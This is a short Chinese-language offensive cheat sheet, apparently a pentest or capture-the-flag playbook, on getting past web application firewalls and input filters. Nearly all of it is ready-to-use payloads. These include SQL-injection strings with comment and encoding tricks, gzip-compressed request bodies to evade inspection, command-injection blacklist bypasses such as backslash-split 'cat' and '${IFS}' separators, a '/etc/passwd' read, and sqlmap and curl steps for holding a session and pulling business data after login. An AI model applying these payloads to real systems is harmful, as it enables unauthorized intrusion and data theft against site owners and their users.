# 主题：WAF / 输入过滤规则绕过

## 场景
登录口 / 参数校验 / 检测入口被 WAF 或自定义过滤规则拦截（常见 ModSecurity、自定义正则、边界代理）。

## 识别
- 常规 payload（如 `admin' OR '1'='1`、`cat /etc/passwd`）返回 **403 / WAF 拦截页** → 有过滤
- 无过滤时同样输入返回 500 / 正常业务响应

## SQLi 绕过
1. **注释语法变体**（绕过基于关键字的规则）：
   - `admin'--`、`admin';--`、`admin'-- -`、`'admin'-- '`、`admin'#`
   - 空格用注释替换：`admin'/**/OR/**/1=1--`
2. **编码**：
   - **gzip 压缩请求体**（Content-Encoding: gzip）绕过内容检测——curl `--compressed` 或手动 gzip 后 POST
   - URL 双重编码、Unicode 规范化、大小写混淆
3. **结构混淆**：分号注入、反斜杠、`%00`、参数污染(HPP)

## 命令注入绕过
1. **黑名单按单词边界** `\b(cat|id|ls|flag)\b` 匹配 → 命令名里插**反斜杠**绕过：
   - `c\at /path/f\lag.txt`（shell 忽略反斜杠，正则 `\b` 匹配不到）
   - 其它：`c""at`、`c'a't`、`/usr/bin/cat` 全路径、`${IFS}` 分隔、`$()` 与反引号
2. 分隔符：`;` `|` `&&` `||` `\n` `$IFS`、`%0a`（URL 编码换行）

## 内容检测绕过
- gzip / deflate 压缩请求体
- multipart boundary 混淆、Content-Type 伪造
- HTTP 方法混淆（GET/POST/HEAD/OPTIONS 带参）、CRLF 注入

## 工具
- `sqlmap --batch --level 2`（WAF 宽松时）；被拦则手动绕过
- curl：`-c cj.txt -b cj.txt` 保持会话；`--compressed` 解压；`--data-binary @<(gzip -c ...)`
- 保持会话后访问登录后页面拿业务数据
